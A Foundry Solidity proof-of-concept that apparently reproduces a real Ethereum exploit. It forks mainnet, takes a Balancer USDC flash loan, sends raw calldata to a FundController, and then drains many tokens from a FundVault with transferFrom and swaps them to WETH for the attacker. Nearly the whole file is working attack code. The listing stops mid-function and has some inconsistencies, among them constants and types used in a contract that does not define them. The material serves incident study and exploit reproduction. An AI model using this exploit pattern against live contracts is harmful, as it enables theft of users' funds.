// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./Base.sol";

// @KeyInfo - Total Lost : 26.04K USD
// Attacker : 0x1e7bd709fb53ef70f6b6f9c04b1bd2e77d0de29a
// Attack Contract : 0x038355a7cab3989c6e28e9fbda6cd08ff9066787
// Vulnerable Contract : 0xf9357a85e79c388c13fb83b237ff759675cc5977
// Attack Tx : 0x549839188e0c47db2643a0a4e1cc3943a29351a51d2e277ea1f3e908073c993d
// Block : 25602279
// Chain : Ethereum
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : attacker_profit_reproduction
// Reproduced Value : 28.24K USD
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_path_entry;
    uint256 constant FORK_BLOCK = 25602278;
    uint256 constant TX_TIMESTAMP = 1784892251;
    uint256 constant TX_BLOCK_NUMBER = 25602279;
    uint256 constant TX_VALUE = 0;

    uint64 constant ATTACKER_EOA_TX_NONCE = 156;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        _prepareCtorProfit();
        _logBalances("Before exploit");
        _deployAttack();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        _alignAttackNonce();
        attack = new OurAttack();
        require(address(attack) == ATTACK_CONTRACT, "unexpected attack contract");
    }

    function _alignAttackNonce() internal {
        uint64 currentNonce = vm.getNonce(ATTACKER_EOA);
        if (currentNonce < ATTACKER_EOA_TX_NONCE) {
            vm.setNonce(ATTACKER_EOA, ATTACKER_EOA_TX_NONCE);
        }
    }

    function _prepareCtorProfit() internal {
        _prepareProfit(ATTACK_CONTRACT, _expectedChild());
    }

    function _expectedChild() internal pure returns (address) {
        return Addresses.attack_child;
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), _expectedAttackChild(attack));
    }

    function _expectedAttackChild(OurAttack attack) internal view returns (address) {
        return address(attack.attackChild());
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.ZERO, "ETH", 14992745880705961062);
        _expectProfit(Addresses.attack_child, attackChild, Addresses.BOOST, "BOOST", 1424999998526411629);
    }
}

contract OurAttack {
    AttackChild public attackChild;

    constructor() payable {
        _deployAttackAttackChildContracts();
        attackChild._prepareAttackChild();
        _decodedCall(address(attackChild), abi.encodeWithSelector(bytes4(0xc0406226)));
        bool attackerEoaReceiveSucceeded;
        (attackerEoaReceiveSucceeded,) = payable(Addresses.attacker_eoa).call{value: 14994683036318135494}(""); // artifact native value transfer with empty calldata; pseudocode raw_call action_0001 line 174 requires exact artifact calldata
        require(attackerEoaReceiveSucceeded, "observed native receive transfer failed");
    }

    function _deployAttackAttackChildContracts() public returns (address) {
        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create address=address(attackChild) constructor=0xeb5eead804bb31f2fb489186ae448edc1d5a95b9|0xeb5eead804bb31f2fb489186ae448edc1d5a95b9|ek:creation_initcode|ch:0xfa63b8f701d2f8687bd5be95b08434d69b4c0eb14939dfc10e3854515c3c4284|entry|entry|len:12935|input:7e8dac9043b200ae|ct:CREATE|dynamic_instantiation runtime_selectors=3 initcode_sha256=0x7e8dac9043b200aed27cde56ab8ca6df532eb7c3550d529908ee819d4dfa58c9 fallback_reasons=none
        attackChild = new AttackChild();
        require(address(attackChild) == 0xEb5EeAD804bb31f2fb489186ae448edC1D5A95B9, "unexpected attack child");
        return address(attackChild);
    }

    function _runExploitPath() internal {}

    receive() external payable {}

    fallback() external payable {
        if (msg.data.length == 0) return;
    }

    function bindAttackChild(address attackChildAddress) external {
        attackChild = AttackChild(payable(attackChildAddress));
    }

    function _boundAttack(bytes memory data) internal {
        _decodedCall(address(attackChild), data);
    }

    function _decodedCall(address target, bytes memory data) internal {
        (bool ok, bytes memory out) = target.call(data);
        if (!ok && out.length > 0) assembly { revert(add(out, 32), mload(out)) }
        require(ok, "attack child dispatch failed");
    }

    bytes32 private constant REPLAY_CALLBACK_4 = keccak256("poc.replay.REPLAY_CALLBACK_4");
    mapping(bytes32 => bool) private _replayActive;

    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _callValue(address targetChild, uint256 value, bytes memory data) internal {
        require(value == 0 || address(this).balance >= value, "insufficient ETH for attack child replay");
        (bool ok, bytes memory out) = targetChild.call{value: value}(data);
        if (!ok && out.length > 0) assembly { revert(add(out, 32), mload(out)) }
        require(ok, "attack child replay failed");
    }

    function _addressArray1(address a0) internal pure returns (address[] memory out) {
        out = new address[](1);
        out[0] = a0;
    }

    function _uintArray1(uint256 a0) internal pure returns (uint256[] memory out) {
        out = new uint256[](1);
        out[0] = a0;
    }

    function _addressArray2(address a0, address a1) internal pure returns (address[] memory out) {
        out = new address[](2);
        out[0] = a0;
        out[1] = a1;
    }
}

contract AttackChild {
    receive() external payable {}

    function run() external payable {
        _borrowFlash();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function receiveFlashLoan(
        address[] calldata arg0,
        uint256[] calldata arg1,
        uint256[] calldata arg2,
        bytes calldata arg3
    ) external payable {
        if (!_replayActive[REPLAY_CALLBACK_4]) {
            _replayActive[REPLAY_CALLBACK_4] = true;
            flashCallback();
            _replayActive[REPLAY_CALLBACK_4] = false;
        }
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    fallback() external payable {
        if (msg.data.length == 0) return;
    }

    function repayBalancerVault() external {
        _repayBalancerToken(Addresses.USDC, 10000000000);
    }

    function repayBalancerVault(address[] calldata tokens, uint256[] calldata amounts) external {
        for (uint256 i = 0; i < tokens.length && i < amounts.length; i++) {
            _repayBalancerToken(tokens[i], amounts[i]);
        }
    }

    function _repayBalancerToken(address token, uint256 amount) internal {
        if (amount == 0) return;
        IERC20Like(token).transfer(Addresses.Vault_BA1222, amount);
    }

    bytes32 private constant REPLAY_CALLBACK_4 = keccak256("poc.replay.REPLAY_CALLBACK_4");
    mapping(bytes32 => bool) private _replayActive;

    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _callValue(address targetChild, uint256 value, bytes memory data) internal {
        require(value == 0 || address(this).balance >= value, "insufficient ETH for attack child replay");
        (bool ok, bytes memory out) = targetChild.call{value: value}(data);
        if (!ok && out.length > 0) assembly { revert(add(out, 32), mload(out)) }
        require(ok, "attack child replay failed");
    }

    function _addressArray1(address a0) internal pure returns (address[] memory out) {
        out = new address[](1);
        out[0] = a0;
    }

    function _uintArray1(uint256 a0) internal pure returns (uint256[] memory out) {
        out = new uint256[](1);
        out[0] = a0;
    }

    function _addressArray2(address a0, address a1) internal pure returns (address[] memory out) {
        out = new address[](2);
        out[0] = a0;
        out[1] = a1;
    }

    function _prepareAttackChild() public payable {}

    function _borrowFlash() internal {
        _recordBalancerPre(_addressArray1(Addresses.USDC)); // Balancer flashLoan post-check uses the live pre-loan vault balances
        if (address(this) != address(this)) {
            (bool ok,) = address(this)
                .call(abi.encodeWithSignature("recordBalancerPre(address[])", _addressArray1(Addresses.USDC))); // share Balancer pre-balances with the observed flashLoan recipient/callback surface
        }
        IVault_BA1222(Addresses.Vault_BA1222)
            .flashLoan(address(this), _addressArray1(Addresses.USDC), _uintArray1(10000000000), hex"");

        uint256 wethBalanceOfAttackHelper = IERC20Like(Addresses.WETH).balanceOf(address(this));
        IWETH(Addresses.WETH).withdraw(wethBalanceOfAttackHelper);
        _callValue(Addresses.attack_path_entry, 14994683036318135494, hex"");
    }

    function flashCallback() internal {
        flashCallback2();
        flashCallback3();
        flashCallback4();
    }

    function flashCallback2() internal {
        IERC20Like(Addresses.USDC).approve(Addresses.FundController, type(uint256).max);
    }

    function flashCallback3() internal {
        IBOOST(Addresses.BOOST).isOpen();
        IBOOST(Addresses.BOOST).assetSlot(Addresses.USDC);
        IERC20Like(Addresses.BOOST).totalSupply();
        IBOOST(Addresses.BOOST).vault();
        IBOOST(Addresses.BOOST).getAssets();
        IERC20Like(Addresses.PROOF).balanceOf(Addresses.FundVault);
        IUniswapV2Router02(Addresses.UniswapV2Router02)
            .getAmountsIn(707361200, _addressArray2(Addresses.WETH, Addresses.PROOF));
        IERC20Like(Addresses.PAPPLE).balanceOf(Addresses.FundVault);
        IUniswapV2Router02(Addresses.UniswapV2Router02)
            .getAmountsIn(97901104234, _addressArray2(Addresses.WETH, Addresses.PAPPLE));
        IERC20Like(Addresses.TOKEN_4507CE).balanceOf(Addresses.FundVault);
        IUniswapV2Router02(Addresses.UniswapV2Router02)
            .getAmountsIn(6400036019, _addressArray2(Addresses.WETH, Addresses.TOKEN_4507CE));
        IERC20Like(Addresses.GURU).balanceOf(Addresses.FundVault);
        IUniswapV2Router02(Addresses.UniswapV2Router02)
            .getAmountsIn(5338040796461305987, _addressArray2(Addresses.WETH, Addresses.GURU));
        IERC20Like(Addresses.ONDO).balanceOf(Addresses.FundVault);
        IUniswapV2Router02(Addresses.UniswapV2Router02)
            .getAmountsIn(161649622411790449, _addressArray2(Addresses.WETH, Addresses.ONDO));
        IERC20Like(Addresses.HTS).balanceOf(Addresses.FundVault);
        IUniswapV2Router02(Addresses.UniswapV2Router02)
            .getAmountsIn(6742821192951948445, _addressArray2(Addresses.WETH, Addresses.HTS));
        IERC20Like(Addresses.SMT).balanceOf(Addresses.FundVault);
        IUniswapV2Router02(Addresses.UniswapV2Router02)
            .getAmountsIn(777245567525464882, _addressArray2(Addresses.WETH, Addresses.SMT));
        IERC20Like(Addresses.DMTR).balanceOf(Addresses.FundVault);
        IUniswapV2Router02(Addresses.UniswapV2Router02)
            .getAmountsIn(5613717879579036580, _addressArray2(Addresses.WETH, Addresses.DMTR));
        IERC20Like(Addresses.WETH).balanceOf(Addresses.FundVault);
        IUniswapV2Router02(Addresses.UniswapV2Router02)
            .getAmountsIn(153555605235617, _addressArray2(Addresses.USDC, Addresses.WETH));
        IBOOST(Addresses.BOOST).minDepositUsd();
        bytes memory fundControllerDepositCallArgs =
            hex"00000000000000000000000000000000000000000000000000000000000000200000000000000000000000006b7fba419afe1fa90d6f5eb4c0af832ebd85d656000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb480000000000000000000000000000000000000000000000000000000005f5e10000000000000000000000000000000000000000000000000000000000000000c00000000000000000000000000000000000000000000000000de0b6b3a764000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000024000000000000000000000000000000000000000000000000000000000000003c0000000000000000000000000000000000000000000000000000000000000054000000000000000000000000000000000000000000000000000000000000006c0000000000000000000000000000000000000000000000000000000000000084000000000000000000000000000000000000000000000000000000000000009c00000000000000000000000000000000000000000000000000000000000000b400000000000000000000000000000000000000000000000000000000000000cc00000000000000000000000000000000000000000000000000000000000000e400000000000000000000000000000000000000000000000000000000000000fc000000000000000000000000000000000000000000000000000000000000010a00000000000000000000000000000000000000000000000000000000000001180000000000000000000000000000000000000000000000000000000000000126000000000000000000000000000000000000000000000000000000000000013400000000000000000000000000000000000000000000000000000000000001420000000000000000000000000000000000000000000000000000000000000150000000000000000000000000000000000000000000000000000000000000015e000000000000000000000000000000000000000000000000000000000000016c0000000000000000000000000733977b9ca2db53f3d796c88e36df3383c72434a0000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000010432fd8ca400000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000046d2000000000000000000000000000000000000000000000000000005d1af7891a6b0000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000006a634b5b0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc200000000000000000000000000000000000000000000000000000000000000000000000000000000733977b9ca2db53f3d796c88e36df3383c72434a0000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000010432fd8ca4000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000863bfc6b572000000000000000000000000000000000000000000000000000000001c1ba6750000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000006a634b5b0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000000000000000000000009b4a69de6ca0defdd02c0c4ce6cb84de5202944e00000000000000000000000000000000000000000000000000000000000000000000000000000000733977b9ca2db53f3d796c88e36df3383c72434a0000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000010432fd8ca40000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000008a1c964c02b0000000000000000000000000000000000000000000000000000000f323d88460000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000006a634b5b0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000129e5915326ed86f831b0e035acda34b209633d500000000000000000000000000000000000000000000000000000000000000000000000000000000733977b9ca2db53f3d796c88e36df3383c72434a0000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000010432fd8ca40000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000007666824557b00000000000000000000000000000000000000000000000000000000fe5088770000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000006a634b5b0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000000000000000000000004507cef57c46789ef8d1a19ea45f4216bae2b52800000000000000000000000000000000000000000000000000000000000000000000000000000000733977b9ca2db53f3d796c88e36df3383c72434a0000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000010432fd8ca400000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000041b9512fb7f00000000000000000000000000000000000000000000000031630536fe69b5ac0000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000006a634b5b0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000aa7d24c3e14491abac746a98751a4883e9b7084300000000000000000000000000000000000000000000000000000000000000000000000000000000733977b9ca2db53f3d796c88e36df3383c72434a0000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000010432fd8ca4000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000001f9ca3d616a2000000000000000000000000000000000000000000000000017edcfbc14985a00000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000006a634b5b0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000faba6f8e4a5e8ab82f62fe7c39859fa577269be300000000000000000000000000000000000000000000000000000000000000000000000000000000733977b9ca2db53f3d796c88e36df3383c72434a0000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000010432fd8ca4000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000e6af4c21fe30000000000000000000000000000000000000000000000003e62356eee9598680000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000006a634b5b0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000c40629464351c37c1e1f47b3640ea2e7aec31ea500000000000000000000000000000000000000000000000000000000000000000000000000000000733977b9ca2db53f3d796c88e36df3383c72434a0000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000010432fd8ca40000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000004e642ceb0470000000000000000000000000000000000000000000000000730e3268266c7760000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000006a634b5b0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000b17548c7b510427baac4e267bea62e800b24717300000000000000000000000000000000000000000000000000000000000000000000000000000000733977b9ca2db53f3d796c88e36df3383c72434a0000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000010432fd8ca4000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000d9f983c6de000000000000000000000000000000000000000000000000033eff472210b87c20000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000006a634b5b0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc200000000000000000000000051cb253744189f11241becb29bedd3f1b5384fdb000000000000000000000000000000000000000000000000000000000000000000000000000000005e0234c98fdcc1c5e69241f6a08c624df6fad91e00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000064af31c1fe000000000000000000000000eb5eead804bb31f2fb489186ae448edc1d5a95b90000000000000000000000009b4a69de6ca0defdd02c0c4ce6cb84de5202944effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff000000000000000000000000000000000000000000000000000000000000000000000000000000005e0234c98fdcc1c5e69241f6a08c624df6fad91e00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000064af31c1fe000000000000000000000000eb5eead804bb31f2fb489186ae448edc1d5a95b9000000000000000000000000129e5915326ed86f831b0e035acda34b209633d5ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff000000000000000000000000000000000000000000000000000000000000000000000000000000005e0234c98fdcc1c5e69241f6a08c624df6fad91e00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000064af31c1fe000000000000000000000000eb5eead804bb31f2fb489186ae448edc1d5a95b90000000000000000000000004507cef57c46789ef8d1a19ea45f4216bae2b528ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff000000000000000000000000000000000000000000000000000000000000000000000000000000005e0234c98fdcc1c5e69241f6a08c624df6fad91e00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000064af31c1fe000000000000000000000000eb5eead804bb31f2fb489186ae448edc1d5a95b9000000000000000000000000aa7d24c3e14491abac746a98751a4883e9b70843ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff000000000000000000000000000000000000000000000000000000000000000000000000000000005e0234c98fdcc1c5e69241f6a08c624df6fad91e00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000064af31c1fe000000000000000000000000eb5eead804bb31f2fb489186ae448edc1d5a95b9000000000000000000000000faba6f8e4a5e8ab82f62fe7c39859fa577269be3ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff000000000000000000000000000000000000000000000000000000000000000000000000000000005e0234c98fdcc1c5e69241f6a08c624df6fad91e00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000064af31c1fe000000000000000000000000eb5eead804bb31f2fb489186ae448edc1d5a95b9000000000000000000000000c40629464351c37c1e1f47b3640ea2e7aec31ea5ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff000000000000000000000000000000000000000000000000000000000000000000000000000000005e0234c98fdcc1c5e69241f6a08c624df6fad91e00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000064af31c1fe000000000000000000000000eb5eead804bb31f2fb489186ae448edc1d5a95b9000000000000000000000000b17548c7b510427baac4e267bea62e800b247173ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff000000000000000000000000000000000000000000000000000000000000000000000000000000005e0234c98fdcc1c5e69241f6a08c624df6fad91e00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000064af31c1fe000000000000000000000000eb5eead804bb31f2fb489186ae448edc1d5a95b900000000000000000000000051cb253744189f11241becb29bedd3f1b5384fdbffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff000000000000000000000000000000000000000000000000000000000000000000000000000000005e0234c98fdcc1c5e69241f6a08c624df6fad91e00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000064af31c1fe000000000000000000000000eb5eead804bb31f2fb489186ae448edc1d5a95b9000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000"; // observed calldata selector 0x0dced77b split from ABI tail bytes // artifact calldata preserved: selector 0x0dced77b has a label but ABI decoding failed; preserving raw calldata; action_graph raw_call carries exact dynamic calldata; preserving artifact bytes before typed ABI re-encoding
        (bool fundControllerDepositCallSucceeded,) =
            Addresses.FundController.call(bytes.concat(bytes4(0x0dced77b), fundControllerDepositCallArgs));
        // artifact-backed FundController settlement tail is preserved because typed caller/prestate context is incomplete.
        IERC20Like(Addresses.PROOF).balanceOf(Addresses.FundVault);
        IERC20Like(Addresses.PROOF).transferFrom(Addresses.FundVault, address(this), 118581363321760);
        IERC20Like(Addresses.PAPPLE).balanceOf(Addresses.FundVault);
        IERC20Like(Addresses.PAPPLE).transferFrom(Addresses.FundVault, address(this), 16412048609278539);
        IERC20Like(Addresses.TOKEN_4507CE).balanceOf(Addresses.FundVault);
        IERC20Like(Addresses.TOKEN_4507CE).transferFrom(Addresses.FundVault, address(this), 1072896310926419);
        IERC20Like(Addresses.GURU).balanceOf(Addresses.FundVault);
        IERC20Like(Addresses.GURU).transferFrom(Addresses.FundVault, address(this), 894864115330446898015880);
        IERC20Like(Addresses.ONDO).balanceOf(Addresses.FundVault);
        IERC20Like(Addresses.ONDO).transferFrom(Addresses.FundVault, address(this), 27098798044693842339112);
        IERC20Like(Addresses.HTS).balanceOf(Addresses.FundVault);
        IERC20Like(Addresses.HTS).transferFrom(Addresses.FundVault, address(this), 1130360173654411317145598);
        IERC20Like(Addresses.SMT).balanceOf(Addresses.FundVault);
        IERC20Like(Addresses.SMT).transferFrom(Addresses.FundVault, address(this), 130296751401318253108153);
        IERC20Like(Addresses.DMTR).balanceOf(Addresses.FundVault);
        IERC20Like(Addresses.DMTR).transferFrom(Addresses.FundVault, address(this), 941078641749450324440247);
        IERC20Like(Addresses.WETH).balanceOf(Addresses.FundVault);
        IERC20Like(Addresses.WETH).transferFrom(Addresses.FundVault, address(this), 6520715467218941);
        IERC20Like(Addresses.PROOF).balanceOf(address(this));
        IERC20Like(Addresses.PROOF).approve(Addresses.UniswapV2Router02, type(uint256).max);
        {
            uint256 uniswapV2Router02SwapExactTokensForTokensSupportingFeeOnTransferTokensAmount = 1; // value provenance: arg1=1 matches prior Addresses.BOOST.isOpen() return
            uint256 swapAmountIn = 118581363321760;
            if (swapAmountIn != 0) {
                IUniswapV2Router02(Addresses.UniswapV2Router02)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        uniswapV2Router02SwapExactTokensForTokensSupportingFeeOnTransferTokensAmount,
                        _addressArray2(Addresses.PROOF, Addresses.WETH),
                        address(this),
                        1784892251
                    );
            }
        }
        IERC20Like(Addresses.PAPPLE).balanceOf(address(this));
        IERC20Like(Addresses.PAPPLE).approve(Addresses.UniswapV2Router02, type(uint256).max);
        {
            uint256 uniswapV2Router02SwapExactTokensForTokensSupportingFeeOnTransferTokensAmount_2 = 1; // value provenance: arg1=1 matches prior Addresses.BOOST.isOpen() return
            {
                uint256 swapAmountIn = 16412048609278539;
                if (swapAmountIn != 0) {
                    IUniswapV2Router02(Addresses.UniswapV2Router02)
                        .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                            swapAmountIn,
                            uniswapV2Router02SwapExactTokensForTokensSupportingFeeOnTransferTokensAmount_2,
                            _addressArray2(Addresses.PAPPLE, Addresses.WETH),
                            address(this),
                            1784892251
                        );
                }
            }
        }
        IERC20Like(Addresses.TOKEN_4507CE).balanceOf(address(this));
        IERC20Like(Addresses.TOKEN_4507CE).approve(Addresses.UniswapV2Router02, type(uint256).max);
        {
            uint256 uniswapV2Router02SwapExactTokensForTokensSupportingFeeOnTransferTokensAmount_3 = 1; // value provenance: arg1=1 matches prior Addresses.BOOST.isOpen() return
            {
                uint256 swapAmountIn = 1072896310926419;
                if (swapAmountIn != 0) {
                    IUniswapV2Router02(Addresses.UniswapV2Router02)
                        .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                            swapAmountIn,
                            uniswapV2Router02SwapExactTokensForTokensSupportingFeeOnTransferTokensAmount_3,
                            _addressArray2(Addresses.TOKEN_4507CE, Addresses.WETH),
                            address(this),
                            1784892251
                        );
                }
            }
        }
        IERC20Like(Addresses.GURU).balanceOf(address(this));
        IERC20Like(Addresses.GURU).approve(Addresses.UniswapV2Router02, type(uint256).max);
        {
            uint256 uniswapV2Router02SwapExactTokensForTokensSupportingFeeOnTransferTokensAmount_4 = 1; // value provenance: arg1=1 matches prior Addresses.BOOST.isOpen() return
            {
                uint256 swapAmountIn = 850120909563924553115086;
                if (swapAmountIn != 0) {
                    IUniswapV2Router02(Addresses.UniswapV2Router02)
                        .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                            swapAmountIn,
                            uniswapV2Router02SwapExactTokensForTokensSupportingFeeOnTransferTokensAmount_4,
                            _addressArray2(Addresses.GURU, Addresses.WETH),
                            address(this),
                            1784892251
                        );
                }
            }
        }
        IERC20Like(Addresses.ONDO).balanceOf(address(this));
        IERC20Like(Addresses.ONDO).approve(Addresses.SwapRouter, type(uint256).max);
        ISwapRouter(Addresses.SwapRouter)
            .exactInputSingle(
                Abi_exactInputSingleWithDeadline_Param0({
                tokenIn: Addresses.ONDO,
                tokenOut: Addresses.WETH,
                fee: 3000,
                recipient: address(this),
                deadline: 1784892251,
                amountIn: 27098798044693842339112,
                amountOutMinimum: 1,
                sqrtPriceLimitX96: 0
            })
            );
        IERC20Like(Addresses.HTS).balanceOf(address(this));
        IERC20Like(Addresses.HTS).approve(Addresses.UniswapV2Router02, type(uint256).max);
        {
            uint256 uniswapV2Router02SwapExactTokensForTokensSupportingFeeOnTransferTokensAmount_5 = 1; // value provenance: arg1=1 matches prior Addresses.BOOST.isOpen() return
            {
                uint256 swapAmountIn = 1130360173654411317145598;
                if (swapAmountIn != 0) {
                    IUniswapV2Router02(Addresses.UniswapV2Router02)
                        .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                            swapAmountIn,
                            uniswapV2Router02SwapExactTokensForTokensSupportingFeeOnTransferTokensAmount_5,
                            _addressArray2(Addresses.HTS, Addresses.WETH),
                            address(this),
                            1784892251
                        );
                }
            }
        }
        IERC20Like(Addresses.SMT).balanceOf(address(this));
        IERC20Like(Addresses.SMT).approve(Addresses.UniswapV2Router02, type(uint256).max);
        {
            uint256 uniswapV2Router02SwapExactTokensForTokensSupportingFeeOnTransferTokensAmount_6 = 1; // value provenance: arg1=1 matches prior Addresses.BOOST.isOpen() return
            {
                uint256 swapAmountIn = 130296751401318253108153;
                if (swapAmountIn != 0) {
                    IUniswapV2Router02(Addresses.UniswapV2Router02)
                        .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                            swapAmountIn,
                            uniswapV2Router02SwapExactTokensForTokensSupportingFeeOnTransferTokensAmount_6,
                            _addressArray2(Addresses.SMT, Addresses.WETH),
                            address(this),
                            1784892251
                        );
                }
            }
        }
        IERC20Like(Addresses.DMTR).balanceOf(address(this));
        IERC20Like(Addresses.DMTR).approve(Addresses.UniswapV2Router02, type(uint256).max);
        {
            uint256 uniswapV2Router02SwapExactTokensForTokensSupportingFeeOnTransferTokensAmount_7 = 1; // value provenance: arg1=1 matches prior Addresses.BOOST.isOpen() return
            {
                uint256 swapAmountIn = 941078641749450324440247;
                if (swapAmountIn != 0) {
                    IUniswapV2Router02(Addresses.UniswapV2Router02)
                        .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                            swapAmountIn,
                            uniswapV2Router02SwapExactTokensForTokensSupportingFeeOnTransferTokensAmount_7,
                            _addressArray2(Addresses.DMTR, Addresses.WETH),
                            address(this),
                            1784892251
                        );
                }
            }
        }
